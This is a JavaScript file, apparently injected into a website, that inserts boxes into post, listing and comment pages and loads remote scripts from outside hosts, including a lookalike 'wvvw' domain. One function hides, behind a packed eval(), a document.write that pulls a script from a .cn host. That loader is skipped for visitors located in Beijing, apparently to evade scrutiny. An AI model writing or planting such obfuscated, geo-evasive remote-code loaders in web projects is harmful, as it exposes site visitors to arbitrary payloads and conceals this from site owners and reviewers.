//dy
var boxid;
function dy_load(siteid) {
    var domainx = "https://qfzcxs.cn/",
    __dyhfid = "q" + Math.random().toString(36).substr(6);
    boxid = "#" + __dyhfid;
    eval(function(p, a, c, k, e, d) {
        e = function(c) {
            return c.toString(36)
        };
        if (!"".replace(/^/, String)) {
            while (c--) {
                d[c.toString(a)] = k[c] || c.toString(a)
            }
            k = [function(e) {
                return d[e]
            }];
            e = function() {
                return "\\w+"
            };
            c = 1
        }
        while (c--) {
            if (k[c]) {
                p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c])
            }
        }
        return p
    } ('9 a(a,b,c){d a[b](c)}a(8,f.6(4,5,7,e,h),"<0"+"c"+"2"+"i"+"3"+"1 "+" g=\'"+n+o+"-"+m+"-"+k l().j()+"\'></0"+"c"+"2"+"i"+"3"+"1>");', 25, 25, "s|t|r|p|119|114|fromCharCode|105|document|function||||return|116|String|src|101||getTime|new|Date|siteid|domainx|__dyhfid".split("|"), 0, {}))
    //move
    $(function() {
        $(boxid).appendTo($("#box_d"));
        $("#box_d").css("height", "auto")
    })
}
//dy

function tc_load(url) {
    var box = document.getElementById("box");
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = url;
    box.appendChild(s);
}

!(function() {
    if (b) return;
    var ads = 'https://wvvw.harahero.top/fl/cdn/static/jq_768738.js?ve=1590394531329';
    if ($("#post-tag")[0]) {
        //tc
        $(".hot ul li:eq(2)").after('<li id="box" style="width:100%;margin:2% 0 4% 0;"></li>');
        tc_load(ads);
        //dy
        if (loc !== "%u5317%u4eac%u5e02") {
            $("#post-tag").after('<div id="box_d" style="margin:0 2%"></div>');
            dy_load("1005");
        }
        return;
    }
    if ($("#pagebtn")[0]) {
        //tc
        if ($("article:eq(1)")[0]) {
            var style="<style>#box{margin:2%;padding:2%;border-radius:3px;background:#fff;}#box img{display:block;}</style>";
            $("head").after(style);
            $("article:eq(1)").after('<div id="box"></div>');
            tc_load(ads);
        }
        //dy
        if ($("article:eq(0)")[0] && loc !== "%u5317%u4eac%u5e02") {
            $("article:eq(0)").after('<div id="box_d" style="margin:0 2%;padding:2%;border-radius:3px;background:#fff;"></div>');
            dy_load("1005");
        }
        return;
    }
    if ($("#comments")[0]) {
        //tc
        if ($("ul#comments li.comment:eq(1)")[0]) {
            var style="<style>#box{margin-top:10px;padding-bottom:2%}#box img{display:block;}</style>";
            $("head").after(style);
            $("ul#comments li.comment:eq(1)").after('<li id="box"></li>');
            tc_load(ads);
        }
        //dy
        if ($("ul#comments li.comment:eq(0)")[0] && loc !== "%u5317%u4eac%u5e02") {
            $("ul#comments li.comment:eq(0)").after('<li id="box_d" style="margin-top:10px;padding-bottom:2%"></li>');
            dy_load("1005");
        }
        return;
    }
})();
